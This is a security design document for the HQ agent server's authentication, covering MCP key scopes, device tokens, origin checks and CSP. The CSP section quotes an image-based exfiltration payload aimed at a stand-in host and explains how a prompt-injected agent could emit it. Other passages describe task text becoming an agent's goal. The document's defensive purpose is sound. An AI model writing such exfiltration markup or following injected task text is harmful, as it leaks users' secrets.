# Web and MCP authentication

This covers the HTTP server that `hq start all` runs on port 5678: `/mcp`, the
REST API under `/api`, the chat socket `/ws`, and the PWA it serves. It closes
HQ-SEC-001, HQ-SEC-004 and HQ-SEC-005.

## `/mcp` fails closed

`/mcp` needs `AGENTHQ_API_KEY` (full access), `AGENTHQ_SPARK_API_KEY` (a
read-only tool allowlist that includes the vault, session logs and session events), `AGENTHQ_TASKS_API_KEY`
(task tools only, listed in `hq_mcp::gateway::TASKS_ALLOWLIST`: list, get, create, update and
comment on tasks, work them under a lease with `task_claim`, `task_next`, `task_heartbeat` and
`task_release`, file or move many with `task_create_many` and `task_update_many`, read links and
time, and list or create folders and initiatives) or `AGENTHQ_HANDOFF_API_KEY` (the read-only set minus
`harness_session_logs`, plus `task_create`, `task_update`, `task_comment_add`,
`harness_session_spawn`, `harness_session_handoff`, `hq_ask` and `hq_ask_result`, as listed in
`hq_mcp::gateway::HANDOFF_ALLOWLIST`; no deletes, no session stop, resume,
send or goal changes, no vault writes). **The handoff key is equivalent to
code execution on every configured host**: a spawned `claude-code`
session runs with permissions skipped. It cannot send to or read the output of
sessions (the registry does not record who started a session, so those tools
would reach sessions the key never started), but it can start an agent anywhere
`agent_host.spawn_cwd_deny` allows. Set `agent_host.handoff_cwd_allow` to the project
roots it may use; leave it empty only for a key you would hand a shell. With the list set, a
call for another folder files an approval request instead; only your signed approval (chat
button, web inbox, `hq queue approve`) turns it into a grant for that folder on that host, and
the grants are listed and revoked through owner-only web routes (`/api/session-folders`). The
gateway tells the tool the call came in on this key, so a client cannot claim
or drop the scope. Send the key as `Authorization: Bearer <key>` or
`x-api-key`. With none of the variables set, every call is refused with
"Unauthorized: this server has no AGENTHQ_API_KEY configured". A value reused
across scopes gets the narrower one (Spark, then tasks, then handoff, then full), and a tool missing from a scope's list is
denied, so a new tool stays out of the scoped keys until it is added by hand.

A refused call is an HTTP `401` with a `WWW-Authenticate: Bearer` challenge (and
`error="invalid_token"` when a credential was sent), carrying the JSON-RPC error as its body.
With the claude.ai connector on (`mcp_connector`, see `docs/CLAUDE_CONNECTOR.md`), the challenge
also names `resource_metadata`, HQ serves OAuth metadata, `/oauth/authorize` (consent origin
only), `/oauth/token` and `/oauth/revoke`, and a connector access token resolves to its grant's
scope (full, Spark read-only or tasks) with the guards in `crates/hq-web/src/oauth/guard.rs`;
none of it exists otherwise. `/oauth/*` and `/.well-known/*` sit outside the origin guard
because Claude calls them server to server; `/api/oauth/*` is behind the web token, the origin
guard and `X-HQ-Client` like the rest of `/api`. `initialize` answers with the protocol version the client asked for
when HQ speaks it (`2025-11-25`, `2025-06-18`, `2025-03-26`, `2024-11-05`), else the newest.

For local development only, `HQ_MCP_DEV_NO_AUTH=1` opens `/mcp` when no key is
configured. It is honoured only when `web_bind` is a loopback address and the
request carries no `Forwarded`, `X-Forwarded-For`, `X-Forwarded-Host`,
`X-Real-IP` or `Tailscale-User-Login` header. Every supported deployment puts
Caddy or `tailscale serve` in front, and both add forwarding headers, so the
switch has no effect there even if it is set by mistake. A configured key always
wins over the switch.

`hq_ask` and `hq_ask_result` (ask HQ's chat agent a question, see `docs/MCP_ASK.md`) follow the
same scoping. The full key may use `mode: full`, which gives the reply every tool a web chat turn
has. The handoff key may only ask in `read_only` mode, which runs the reply under the read-only
permission preset, and can read back only the asks it made. The Spark key has neither tool.
A handoff-key ask turn also loses the tools the handoff key is kept off (session logs and lists, host panes, file and git readers, specialist sub-agents; see `docs/MCP_ASK.md`), and the key may continue only threads its own asks started in which the owner has typed nothing. Questions are capped at 20,000 characters, with 3 asks waiting at once, 6 new asks per minute and 200 per day per key. The gateway sets the
scope marker, so a client cannot claim `full` for a handoff call. The answer is model output and
must be treated as untrusted by the caller.

The **tasks key** is the one to give an editor agent on a machine you do not control. It has no
vault tools, so your notes never reach that client (except text already copied into a task, for
example by promoting a note to a task), and no session, `hq_ask`, delete or config tools, so it is
not code execution anywhere. The task tools also know a call came in on it (the gateway sets a
private marker and strips any the caller sends) and then:

- set no routing tags and ignore a `tags` change on update (a tag names a mailbox that the relay,
  the agent worker and harnesses drain, so a tag would put text in front of your chat or an agent);
- send no mailbox notification on create, update or unblock, and raise no `ready_for_review`
  approval item in the web inbox;
- set no assignees (an assignee is mailed like a tag);
- write `mcp:tasks` as the author instead of a name the caller picks. A work lease taken on the
  scope is named `mcp:tasks/<name>`, so the agent's own name shows but always marked as this key;
  any other caller is refused a name of that shape, and the scope cannot heartbeat, release or
  write under a lease it did not take;
- see who holds a task and since when, but no session's host, folder or branch, no absolute or
  out-of-project path in a resume point's `files`, and no link to a vault note (it cannot add one,
  and `task_link_list` refuses a note lookup). New thread comments no longer name a host, folder or
  branch, but comments written before this change still do, and agent-written text (a summary, a
  next step, a comment) can name anything, so treat the thread as readable by this key;
- never take over another session's lease (`takeover` is refused), so it cannot end one HQ launched;
- apply all of this to every item of a bulk call, whatever an item or `defaults` says;
- edit a task's title and description only on tasks the scope filed itself, because a linked
  session's goal and a launched session's prompt are built from them; status, priority, dates and
  comments are open on any task;
- cap a title at 500 characters and a description or comment at 20,000, and cannot force a
  rebuild of the related-tasks index. There is **no rate limit**, so a holder can still create many
  tasks and comments.

What remains: it reads every task space, including `personal`, and it can still change the status
and add comments to your tasks, so treat task text as untrusted input wherever an agent acts on
it, and especially text in tasks it created: if you link a session to one of those, the
description becomes that session's goal. A key shared with another scope gets the narrower one.
Its stdio form (`hq mcp-serve --scope tasks`) applies the same list, but it is a flag in a file
the user can edit and anyone who can run `hq` on that machine can start a full server, so only the
remote key is enforced on the server. The stdio entry also carries `HQ_VAULT_PATH`, your vault's
path on that machine.

Generate a key with `openssl rand -hex 32` and keep it in a root-readable env
file loaded by the service (the sample unit layout uses `/opt/hq/mcp.env`, loaded by the
`hq.service.d/mcp-key.conf` drop-in).

`tools/list` returns the two gateway tools (`hq_discover`, `hq_call`) for every
key, never the registry. What differs by scope is the rest: `hq_discover` lists
only tools in the key's allowlist, `hq_call` refuses any other tool, and the
category names in the `hq_discover` description are limited to categories that
hold an allowed tool. `crates/hq-web/src/mcp_http.rs` tests all of this through
an HTTP router for the full, handoff and Spark keys, and a missing key.

## Files HQ writes

`config.yaml`, every backup of it (`.bak`, `.bak.N`, `.bak-model-switch`) and
the directory HQ creates for it are owner-only (0600 and 0700) on unix, and an
existing looser config is tightened the next time HQ saves it. Backups made by
earlier versions keep their old mode: run `chmod 600 ~/.hq/config.yaml*`. HQ
does not write `.env` files; create service env files such as `/opt/hq/mcp.env`
with mode 0600 owned by the service user.

## Web token: headers only

`web_auth_token` (env `HQ_WEB_AUTH_TOKEN`) guards `/ws` and `/api/*`, together with
the device tokens described below. Both are accepted only as `Authorization: Bearer`. URL tokens (`?token=`) are refused,
because URLs end up in browser history, proxy logs and `Referer` headers.

- **Chat socket.** Browsers cannot set headers on a WebSocket, so the PWA calls
  `POST /api/ws-ticket` with the header and opens `/ws?ticket=<ticket>`. A
  ticket works once, expires after 30 seconds, and opens `/ws` only; at most 256
  are outstanding.
- **`hq chat --server`.** The CLI is not a browser, so it sends the token as a
  Bearer header on the `/ws` upgrade and needs no ticket. It reads the token
  from `HQ_WEB_AUTH_TOKEN` (or, for the local daemon only, `web_auth_token`).
  Loopback servers may use `http`/`ws`; any other host is refused unless a token
  is set and the URL is `https`/`wss`. Plain `hq chat` stays in-process.
  `--server` (or `HQ_CHAT_SERVER=auto` for a daemon on the loopback
  `web_bind`/`ws_port`) opts in, and before any token is sent the target's
  `/health` must answer with `"service": "agent-hq"`, so another program on
  that port never receives it. `--local` forces the in-process backend.
- **Session-changing requests.** `send` and `adopt` under
  `/api/harness-sessions/` must carry `X-HQ-Client` (the PWA's `hqFetch` adds it
  to every non-GET). `drive`, `goal` and `unwatch` predate the header and stay
  open so a cached PWA can still stop a session; a cross-site form post could
  toggle them on a token-less loopback setup. The origin guard trusts any loopback page when no web token
  is set, and a plain form post needs no preflight, so the header (which the CORS
  layer does not allow) is what keeps another local page from typing into an
  agent. The Vite dev server proxies `/api`, so it stays same-origin.
- **Vault files.** `<img>` tags and download links cannot send headers either.
  With a token set, the PWA fetches the file with the header and shows it from a
  blob URL (`src/lib/useAssetUrl.ts`). pdf.js gets the header directly.
- **First login.** A browser picks the token up once from a `#token=<token>`
  link and keeps it in local storage. The fragment never reaches the server.
  Old `?token=` links still work in the PWA but have already been logged by
  whatever proxy served the page, so rotate a token that was shared that way.
  When the server answers a request with 401 (no token here, or one that was signed out),
  the PWA shows a "Sign in to HQ" banner with a field to paste the token, which
  it stores the same way. Copies the service worker serves from its cache never
  trigger it.
- **`/login` from a chat.** The Telegram and Discord bots answer `/login` (and
  `!login`) with a `#token=` link carrying a new device token ("Telegram /login" or
  "Discord /login" in Settings, Devices), so that token lands in that chat's history.
  It is minted only after the owner and private-chat checks pass, and only on a server
  that already asks for a sign-in, so `/login` never turns sign-in on.
  That chat already drives the whole agent, so it gains no new reach. Only the
  owner gets the link, only in a private chat or DM, never a guest or a Discord
  family user, and the reply is never mirrored into HQ's thread store. Telegram
  asks the owner to delete it. A Discord DM user can't delete the bot's
  messages, so `!login` points at the `/login` slash command, whose ephemeral
  reply Discord doesn't keep.
- **Replacing a model key.** `POST /api/settings/provider-key` refuses to run
  unless a web token is configured, like first-run setup, and needs the
  `X-HQ-Client` header. It tests the key with a one-token call and writes it to
  `config.yaml` only if that works. The key is never returned or logged, and is
  scrubbed from the provider's error text. A key the environment pins
  (`HQ_<PROVIDER>_API_KEY` or the provider's own variable) answers 409, because
  a config write would be hidden behind it; a copy HQ itself exported from the
  config does not count. Lite does not serve it.
- **Signing in another device.** Settings, Devices on a signed-in browser calls
  `POST /api/auth/device-code` (behind the token) and shows a one-time code and
  a QR code of `<origin>/vault#code=<code>`. The QR code carries the same
  one-time code, never a token: the PWA takes `#code=` out of the address bar
  before the first redirect and the banner trades it. On the new device the
  banner trades the code at `POST /api/auth/exchange` for a device token of its
  own. Details below.

### `/api/auth/exchange`, the one unauthenticated `/api` route

The web token guard skips exactly this path (not `/api/auth/exchange/...`); the
origin guard still checks it, and it needs `X-HQ-Client`, so a hostile page can
neither call it nor read its answer.

- A code is 10 characters from the alphabet `hq pair` uses (no 0, O, 1, I or L),
  about 49 bits, shown as `XXXXX-XXXXX`. Case, spaces and hyphens are ignored.
- It works once and lasts 10 minutes. Issuing a new one replaces the old one.
  Only a salted SHA-256 is kept, in memory, so a restart voids it.
- A wrong, spent or expired code all get the same `401`. The comparison is
  constant time.
- Five wrong codes from one client within 10 minutes get that client `429`
  until the window passes, even with the right code. The client is the first
  `X-Forwarded-For` (or `X-Real-IP`) address: behind Tailscale Serve or Caddy
  every peer is loopback, so a caller who reaches HQ directly can forge it.
  That limit is best effort.
- The real bound is global: 20 wrong codes from anyone within 10 minutes burn
  the pending code and answer `429` to everyone until the window passes. That
  is at most 20 guesses per code against 31^10.
- Both routes answer `404` when the server asks for no sign-in (no configured
  token and no device token), since there is nothing to hand out, and both send
  `Cache-Control: no-store`.
- A successful exchange is logged (without the code or the token) and the owner
  gets a "A new device signed in to HQ" notice in the inbox, the chat relay and
  Web Push (when each is set up).
- The token handed out is a new device token ("Signed in with a code"), never
  the configured one, so that device can be signed out on its own.

### Device tokens and signing out

Every sign-in HQ hands out is its own device token: the exchange, `/login`,
`hq web link` (and `sudo hq-join --print-link`, which runs it; servers whose
`hq-join` predates that flag run `hq web link` as the `hq` user, see
`docs/HETZNER.md`) and "Sign out
everywhere". A device token is `hqw_` plus 64 hex characters (two v4 UUIDs). It
is returned once; the `web_device_tokens` table keeps only its SHA-256 (hex),
a label, when it was made and when it was last used (updated at most every five
minutes, so a request is not a write). A presented Bearer secret is valid when:

- it equals the configured token (constant-time compare) and that token's hash is
  not in `web_revoked_tokens`; or
- it starts with `hqw_` and its SHA-256 matches a row that has not expired. The
  lookup is by hash, so it leaks no timing an attacker can use without a preimage.

A database error refuses a device token. Whether the configured token is signed
out is cached in memory: read when the server starts, set by this server's own
rotate, and read again at most every 60 seconds while it is live (another server on
the same database may sign it out). So an instance that never rotates answers its
configured token without a database read, and a database error keeps an earlier
"live" rather than locking it out; with nothing known yet, the error refuses.
Device-token lookups and the "is sign-in on" check run on a blocking thread
(`spawn_blocking`), off the async workers. The checks live in one place,
`WsState::web_credential` (`crates/hq-web/src/auth.rs`), and the matched
credential rides in the request's extensions so the devices list can mark
"this device". `hq_core::redact` also scrubs `hqw_` tokens from text it redacts.

**Whether sign-in is on at all** (`WsState::web_auth_enabled`) means a configured
token exists, signed out or not, or any device token row does. A signed-out
configured token still counts, so signing out every device never leaves the API
open; the middleware then refuses everything until someone mints a new token with
`hq web link` or `/login`. First-run setup, chat apps, restart, the origin guard's
token-less host check and the device routes all read this one function. A database
error counts as "on". An instance with no configured token and no device rows
behaves exactly as before. `check_web_bind` still looks only at the configured
token, so a non-loopback bind still needs one at startup.

**Routes**, all behind the sign-in, the origin guard and (for writes)
`X-HQ-Client`, all `404` when sign-in is off:

- `GET /api/auth/devices`: id, label, created and last-used times, whether it is
  the caller, whether the configured token still works. Never a token or a hash.
- `DELETE /api/auth/devices/{id}`: signs one device out. It also drops the Web Push
  subscriptions that device saved (each subscription records the device token it
  was saved with), closes every open chat socket and live session view, and voids
  socket tickets; devices still signed in reconnect.
- `POST /api/auth/rotate` ("Sign out everywhere"): in one SQLite transaction it
  deletes every device token, records the configured token's hash as signed out,
  and mints one token labelled "Sign out everywhere", which it returns
  (`Cache-Control: no-store`). It voids the pending device code before and after
  that transaction, and holds a lock that the code exchange also takes, so a code
  redeemed during a rotate cannot mint a token after it and two rotates run one at a
  time (the second caller's token is the one that survives). It then voids socket
  tickets, closes every open chat socket and live session view (an epoch each one
  watches), revokes every claude.ai connector grant and closes the connector's
  approval window (`mcp_connector::revoke_all`), drops every Web Push subscription,
  and only then notifies the owner without the token, so no stranger's browser is
  pushed the notice. The PWA stores the new token and reloads; its own push
  subscription is sent again on that load, and Claude has to be connected again.

**The configured token after a sign-out everywhere.** It is refused from then on.
Revocation is stored as the token's hash, not a flag, so an operator who puts a new
value in `HQ_WEB_AUTH_TOKEN` (or `web_auth_token`) turns the configured token back
on by design. `hq-join --print-link` no longer prints the bootstrap token when the
installed `hq` has `web link`: it runs
`runuser -u hq -- env HQ_CONFIG_PATH=... HQ_VAULT_PATH=... hq web link`, passing the
bootstrap token in the environment so the CLI knows sign-in is on, and fails rather
than print a token that may be signed out. `hq web link` refuses to open the
database unless the vault's database (or `_data`, or the vault) belongs to the
user running it, so root never creates WAL files the service cannot write.

**Local callers that used the configured token:**

- `hq notify-restart` (run by the updater as the service user) sends the configured
  token while it is not signed out. After that it mints a device token labelled
  "Restart notice" that expires in 60 seconds, uses it for the one loopback call,
  and deletes it. It opens the database only as its owner and never migrates it
  (`Database::open_existing`), since the updater may run a newer binary than the
  daemon; a database without the new tables reads as "not signed out".
- `hq web` and `hq web --json` print the configured token while it works. Once it is
  signed out they print no token (`login_url` is the bare address, and the JSON
  carries `"token_signed_out": true`) and point at `hq web link`. They never mint, so
  an agent polling `hq web --json` leaves no stray devices; `hq web link` is the one
  CLI command that makes a sign-in. A user who does not own the vault cannot check,
  and prints the configured token as before.
- `hq chat --server` still sends `HQ_WEB_AUTH_TOKEN` (or, for the local daemon, the
  configured token). It does not open the database, since any user can run it. After
  a sign-out everywhere, set `HQ_WEB_AUTH_TOKEN` to the token from an `hq web link`
  link; the connect error says so.
- `hq connector` and `mcp_connector` only check that a configured token exists. The
  consent page signs the owner in through the browser's own token, so a device token
  works there.
- **Chat apps and restart.** `POST`/`DELETE /api/chat-apps/{platform}`,
  `.../verify`, `.../pair` and `POST /api/system/restart` refuse to run unless a
  web token is configured, like first-run setup: behind `tailscale serve` every
  request comes from loopback, and a pairing code makes its holder the owner of
  an agent with full tools. Bot tokens go into `config.yaml` and nowhere else;
  `GET /api/chat-apps` reports only whether one is set, and outbound check
  errors are replaced with fixed text because a Telegram token sits in the
  request URL. Restart is offered only under systemd (`INVOCATION_ID`) or the
  configured launchd job (`XPC_SERVICE_NAME`), and Lite serves none of these
  routes.

One exception remains: `/hooks/gmail` takes its own `GMAIL_WEBHOOK_SECRET`. Send
it as `Authorization: Bearer <secret>` whenever the sender can set headers. The
`?token=<secret>` form still works because Pub/Sub push subscriptions cannot set
headers, but a URL secret is recorded by any proxy access log in front of HQ
(Caddy logs request URIs when access logging is on), so prefer the header and
rotate the secret if a proxy log with the query form leaves your control. HQ
itself never writes the query string or the headers of this route to its logs
(tested with a log-capture layer). The secret only triggers an inbox poll.

## Response headers and vault files

Every response from the web server carries `X-Content-Type-Options: nosniff`,
`Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`, and a
`Content-Security-Policy` built in `crates/hq-web/src/security_headers.rs`:

- `default-src 'self'`; `object-src 'none'`; `frame-ancestors 'none'`;
  `base-uri 'self'`; `form-action 'self'`; `img-src 'self' data: blob:`;
  `connect-src 'self' blob:` plus `ws://` and `wss://` for the request's own
  `Host` (only when it is a plain host[:port]), so older Safari lets the chat
  socket through.
- `script-src 'self' 'wasm-unsafe-eval'` plus a `sha256-` source for each inline
  script in the prerendered `index.html`. The shell carries a few inline
  bootstrap scripts, so a nonce-free strict policy needs their hashes. They are
  read when the server starts, so a new web build needs a restart (a deploy
  already restarts). No `unsafe-eval` and no `unsafe-inline` for scripts.
  `wasm-unsafe-eval` is for the syntax highlighter and pdf.js.
- `style-src 'self' 'unsafe-inline'`. React and the highlighter emit style
  attributes, which only `unsafe-inline` allows. This is the one relaxation.

**Remote images are blocked on purpose.** Notes and chat replies are rendered
from markdown that a prompt-injected agent or a shared note can write, and an
image URL is a way to send data out (`![](https://evil.example/p?d=<secret>)`).
Allowing `img-src https:` would make every rendered note an exfiltration channel,
so only same-origin, `data:` and `blob:` images load. The markdown viewer and
the HTML preview replace a remote `<img>` with the text `[remote image
blocked: alt]` (`apps/hq-web/src/lib/remoteImages.ts`). If remote images become
a feature, add `https:` to `img-src` knowing that tradeoff.

Inline script hashes must be computed on the text the HTML parser produces, not
the file's raw bytes: CRLF and lone CR become LF, NUL becomes U+FFFD, and
invalid UTF-8 becomes U+FFFD. The TanStack stream barrier contains raw NUL bytes,
so a raw-byte hash silently never matches and the app renders blank
(`security_headers::normalize_script_text`). `apps/hq-web/scripts/csp-smoke.mjs`
loads the served app in headless Chromium and fails on any CSP violation or a
blank page; it needs the optional `playwright` package and skips without it
(`CSP_SMOKE_REQUIRED=1` turns the skip into a failure).

The built-app CSP tests in `crates/hq-web/src/lib.rs` need `bun run build` in
`apps/hq-web`. They skip when `dist/` is missing, unless `HQ_REQUIRE_BUILT_APP=1`
is set, which makes the skip a failure. CI should build the app and set it.

`/api/vault-asset` serves `svg`, `html`, `htm`, `xhtml` and `xml` files with
`Content-Disposition: attachment` and `Content-Security-Policy: sandbox`, so
opening one of those URLs cannot run script on HQ's origin. The PWA shows
vault images through blob URLs, which this does not affect.

## Cross-origin requests

CORS only hides responses from a hostile page. It does not stop the request
itself, and it does not apply to WebSockets. So `origin::origin_guard` refuses a
request to `/api`, `/ws` or `/mcp` when:

- it carries an `Origin` that is not a loopback origin, not listed in
  `web_allowed_origins`, and not the server's own origin (`Origin` authority
  equal to `Host`); or
- no web token is set and its `Host` is neither a loopback name nor the host of
  a `web_allowed_origins` entry. This stops DNS rebinding, where a hostile name
  resolves to 127.0.0.1 and the page becomes same-origin with HQ.

CORS grants read access to the same set of origins and no others. Requests with
no `Origin` (curl, MCP clients, the Telegram relay) are not affected.

List every origin the PWA is served from, including the port:

```yaml
web_allowed_origins:
  - https://hq.example.ts.net:8443
  - https://hq.example.ts.net:8444
```

If the PWA loads but every API call returns 403 "unrecognised Host header", the
origin it is served from is missing from this list.

## Residual risks

- A browser extension, or any process on the same machine, can make requests
  without an `Origin` header. Unauthenticated loopback mode trusts the machine,
  so set `web_auth_token` on shared machines.
- The token lives in the PWA's local storage, so script injection into the PWA
  would expose it. Vault HTML is sanitised with DOMPurify before rendering.
- Any valid token can sign every other device out, the owner's included. That
  holder could already drive the whole agent; the owner gets back in with `/login`
  or a new operator link and signs out everywhere again.
- Signing one device out closes every open chat socket and live session view, not
  only that device's, because they are not tied to a device. The others reconnect
  at once.
- Tested with Axum request-level tests (`crates/hq-web/src/origin.rs`,
  `auth.rs`, `lib.rs`). They send the `Origin` and `Host` headers that Chrome,
  Firefox and Safari send, but no real browser runs them.
